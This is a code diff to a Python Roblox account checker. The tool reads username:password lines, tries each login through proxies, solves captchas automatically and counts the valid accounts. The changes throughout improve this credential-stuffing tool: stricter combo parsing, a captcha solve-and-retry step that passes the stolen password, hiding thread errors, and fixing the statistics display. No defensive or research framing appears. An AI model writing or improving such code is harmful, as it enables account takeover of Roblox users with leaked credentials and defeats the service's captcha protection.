@@ -61,12 +61,17 @@ def check_account_task(account_line, proxy_dict):
             update_stats("invalid")
             return
 
-        parts = account_line.strip().split(':')
+        parts = account_line.strip().split(':', 1)
+        if len(parts) != 2:
+            update_stats("invalid")
+            return
+            
         username = parts[0]
         password = parts[1]
         
         session = RobloxSession(proxy=proxy_dict)
         session.url = "https://www.roblox.com/login"
+        session.username = username  # Store for retry
         
         # 1. Login Attempt
         login_success = session.login(username, password)
@@ -74,19 +79,23 @@ def check_account_task(account_line, proxy_dict):
         if not login_success:
             if session.needs_captcha:
                 add_log(f"⚡ Captcha detected for {username}...", "yellow")
-                solved = solve_captcha_wrapper(session)
                 
-                if solved:
+                # Use solve_captcha_and_retry with password parameter
+                solved = session.solve_captcha_and_retry(
+                    lambda sk, url, blob: solve_captcha_wrapper.__globals__.get('get_solver_instance')().solve_with_token(sk, url, blob),
+                    password=password
+                )
+                
+                if solved and session.is_logged_in:
                     update_stats("captcha_solved")
-                    time.sleep(1)
-                    login_success = session.login(username, password)
+                    add_log(f"✅ {username}: Captcha solved & logged in!", "green")
                 else:
                     update_stats("errors")
                     add_log(f"❌ {username}: Captcha failed", "red")
                     return
-            
-            if not login_success:
+            else:
                 update_stats("invalid")
+                add_log(f"❌ {username}: Invalid credentials", "red")
                 return
 
         # 2. Get Info
@@ -108,7 +117,10 @@ def check_account_task(account_line, proxy_dict):
 
     except Exception as e:
         update_stats("errors")
-        add_log(f"❌ Error: {str(e)[:40]}", "red")
+        error_msg = str(e)[:40]
+        # Silence greenlet/thread errors
+        if "greenlet" not in error_msg.lower() and "thread" not in error_msg.lower():
+            add_log(f"❌ Error: {error_msg}", "red")
 
 def create_layout():
     layout = Layout()
@@ -167,9 +179,9 @@ def main():
                 with stats_lock:
                     stats_text = (
                         f"[green]Valid:[/green] {stats['valid']}  "
-                        f"[red]Invalid:[/green] {stats['invalid']}  "
-                        f"[yellow]Captcha:[/green] {stats['captcha_solved']}  "
-                        f"[magenta]Errors:[/green] {stats['errors']}"
+                        f"[red]Invalid:[/red] {stats['invalid']}  "
+                        f"[yellow]Captcha:[/yellow] {stats['captcha_solved']}  "
+                        f"[magenta]Errors:[/magenta] {stats['errors']}"
                     )
                     
                     log_table = Table(show_header=False, box=None, padding=(0, 1))
@@ -177,8 +189,13 @@ def main():
                         for entry in activity_log:
                             log_table.add_row(entry)
                     
+                    # Build the panel content properly
+                    panel_content = f"{stats_text}\n"
+                    for row in activity_log:
+                        panel_content += f"{row.plain if hasattr(row, 'plain') else str(row)}\n"
+                    
                     return Panel(
-                        f"{stats_text}\n\n" + "".join([log_table.__rich__() if hasattr(log_table, '__rich__') else str(log_table)]),
+                        panel_content,
                         title="📊 Statistics & Activity",
                         border_style="green"
                     )
